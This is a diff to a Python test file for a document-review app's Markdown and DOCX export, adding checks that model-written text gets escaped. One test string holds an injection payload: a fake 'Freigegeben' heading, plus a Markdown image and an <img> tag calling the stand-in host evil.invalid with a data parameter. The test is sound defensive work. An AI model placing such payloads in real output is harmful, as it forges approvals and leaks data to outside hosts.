@@ -1,14 +1,18 @@
 import io
+import re
 
 from docx import Document
 
 from app.demo import demo_analysis
-from app.export import docx, markdown
+from app.export import docx, markdown, md
 
 
 def test_unverified_proposal_is_preserved_and_labeled_without_revision_notice():
     analysis = demo_analysis()
-    finding = analysis.findings[0].model_copy(update={"verified": False})
+    injected = (
+        "Prüfen.\n# Freigegeben\n![x](https://evil.invalid/?d=1) <img src=https://evil.invalid>"
+    )
+    finding = analysis.findings[0].model_copy(update={"verified": False, "description": injected})
     analysis = analysis.model_copy(update={"findings": [finding]})
 
     text = markdown(analysis).decode("utf-8")
@@ -18,8 +22,10 @@ def test_unverified_proposal_is_preserved_and_labeled_without_revision_notice():
     assert finding.source_quote in paragraphs
     assert finding.suggestion in paragraphs
     assert "Formulierungsvorschlag" in paragraphs
-    assert "> " + finding.source_quote.replace("\n", "\n> ") in text
-    assert f"**Formulierungsvorschlag**\n\n{finding.suggestion}" in text
+    assert "> " + md(finding.source_quote).replace("\n", "\n> ") in text
+    assert f"**Formulierungsvorschlag**\n\n{md(finding.suggestion)}" in text
+    # Model text from an untrusted document must not become HTML, images or headings.
+    assert not re.search(r"(?<!\\)(<img|!\[|\n# Freigegeben)", text)
     for exported in (text, "\n".join(paragraphs)):
         assert "Zitat im Dokument bestätigt: Nein." in exported
         assert "folgenden Revisionen" not in exported
@@ -40,10 +46,11 @@ def test_comparison_exports_both_versions_and_revises_only_counterdraft():
     assert finding.suggestion in [node.text for node in document.element.xpath("//w:ins//w:t")]
     for exported in (text, paragraphs):
         assert "Original" in exported and "Gegenentwurf" in exported
-        assert finding.comparison.original.source_quote in exported
-        assert finding.comparison.counterdraft.source_quote in exported
-        assert finding.comparison.original.source_document_name in exported
-        assert finding.comparison.counterdraft.source_document_name in exported
+        escape = md if exported is text else str
+        assert escape(finding.comparison.original.source_quote) in exported
+        assert escape(finding.comparison.counterdraft.source_quote) in exported
+        assert escape(finding.comparison.original.source_document_name) in exported
+        assert escape(finding.comparison.counterdraft.source_document_name) in exported
     deletions = [node.text for node in document.element.xpath("//w:delText")]
     assert finding.comparison.counterdraft.source_quote in deletions
     assert finding.comparison.original.source_quote not in deletions
